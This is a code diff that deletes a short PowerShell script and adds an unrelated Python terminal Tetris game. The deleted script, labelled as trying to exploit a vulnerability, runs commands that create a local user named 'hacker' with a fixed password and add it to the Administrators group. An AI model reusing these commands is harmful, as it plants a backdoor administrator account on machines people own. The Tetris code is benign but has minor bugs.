@@ -1,15 +1,127 @@
-# Проверка на административные привилегии
-function Test-Admin {
-    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
-    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
-}
+import random
+import curses
 
-if (Test-Admin) {
-    Write-Host "[+] Already running with administrative privileges!"
-} else {
-    Write-Host "[!] Not running with administrative privileges."
-    Write-Host "[+] Trying to exploit vulnerability..."
-    # Пример: Запуск команды от имени SYSTEM
-    Start-Process -FilePath "cmd.exe" -ArgumentList "/c net user hacker P@ssw0rd /add" -Verb RunAs
-    Start-Process -FilePath "cmd.exe" -ArgumentList "/c net localgroup administrators hacker /add" -Verb RunAs
-}
+# Определение фигур
+SHAPES = [
+    [[1, 1, 1, 1]],  # I
+    [[1, 1], [1, 1]],  # O
+    [[1, 1, 0], [0, 1, 1]],  # Z
+    [[0, 1, 1], [1, 1, 0]],  # S
+    [[1, 1, 1], [0, 1, 0]],  # T
+    [[1, 1, 1], [1, 0, 0]],  # L
+    [[1, 1, 1], [0, 0, 1]]   # J
+]
+
+# Цвета для фигур
+COLORS = [
+    curses.COLOR_RED,
+    curses.COLOR_GREEN,
+    curses.COLOR_YELLOW,
+    curses.COLOR_BLUE,
+    curses.COLOR_MAGENTA,
+    curses.COLOR_CYAN,
+    curses.COLOR_WHITE
+]
+
+class Tetris:
+    def __init__(self, width, height):
+        self.width = width
+        self.height = height
+        self.board = [[0 for _ in range(width)] for _ in range(height)]
+        self.current_shape = self.new_shape()
+        self.current_x = width // 2 - len(self.current_shape[0]) // 2
+        self.current_y = 0
+        self.score = 0
+
+    def new_shape(self):
+        shape = random.choice(SHAPES)
+        color = random.choice(COLORS)
+        return shape, color
+
+    def check_collision(self, shape, x, y):
+        for i, row in enumerate(shape):
+            for j, cell in enumerate(row):
+                if cell:
+                    if y + i >= self.height or x + j < 0 or x + j >= self.width or self.board[y + i][x + j]:
+                        return True
+        return False
+
+    def merge_shape(self):
+        shape, color = self.current_shape
+        for i, row in enumerate(shape):
+            for j, cell in enumerate(row):
+                if cell:
+                    self.board[self.current_y + i][self.current_x + j] = color
+
+    def clear_lines(self):
+        lines_cleared = 0
+        for i in range(self.height):
+            if all(self.board[i]):
+                del self.board[i]
+                self.board.insert(0, [0 for _ in range(self.width)])
+                lines_cleared += 1
+        self.score += lines_cleared ** 2
+
+    def move(self, dx):
+        new_x = self.current_x + dx
+        if not self.check_collision(self.current_shape[0], new_x, self.current_y):
+            self.current_x = new_x
+
+    def rotate(self):
+        shape, color = self.current_shape
+        new_shape = list(zip(*shape[::-1]))
+        if not self.check_collision(new_shape, self.current_x, self.current_y):
+            self.current_shape = (new_shape, color)
+
+    def drop(self):
+        new_y = self.current_y + 1
+        if not self.check_collision(self.current_shape[0], self.current_x, new_y):
+            self.current_y = new_y
+        else:
+            self.merge_shape()
+            self.clear_lines()
+            self.current_shape = self.new_shape()
+            self.current_x = self.width // 2 - len(self.current_shape[0]) // 2
+            self.current_y = 0
+            if self.check_collision(self.current_shape[0], self.current_x, self.current_y):
+                return True
+        return False
+
+    def draw(self, stdscr):
+        stdscr.clear()
+        for y in range(self.height):
+            for x in range(self.width):
+                if self.board[y][x]:
+                    stdscr.addstr(y, x * 2, "██", curses.color_pair(self.board[y][x]))
+        shape, color = self.current_shape
+        for i, row in enumerate(shape):
+            for j, cell in enumerate(row):
+                if cell:
+                    stdscr.addstr(self.current_y + i, (self.current_x + j) * 2, "██", curses.color_pair(color))
+        stdscr.addstr(self.height, 0, f"Score: {self.score}")
+
+def main(stdscr):
+    curses.curs_set(0)
+    curses.start_color()
+    for i, color in enumerate(COLORS, 1):
+        curses.init_pair(i, color, curses.COLOR_BLACK)
+    tetris = Tetris(10, 20)
+    while True:
+        tetris.draw(stdscr)
+        key = stdscr.getch()
+        if key == curses.KEY_LEFT:
+            tetris.move(-1)
+        elif key == curses.KEY_RIGHT:
+            tetris.move(1)
+        elif key == curses.KEY_UP:
+            tetris.rotate()
+        elif key == curses.KEY_DOWN:
+            if tetris.drop():
+                break
+        stdscr.refresh()
+    stdscr.addstr(tetris.height // 2, tetris.width, "Game Over!")
+    stdscr.refresh()
+    stdscr.getch()
+
+if __name__ == "__main__":
+    curses.wrapper(main)
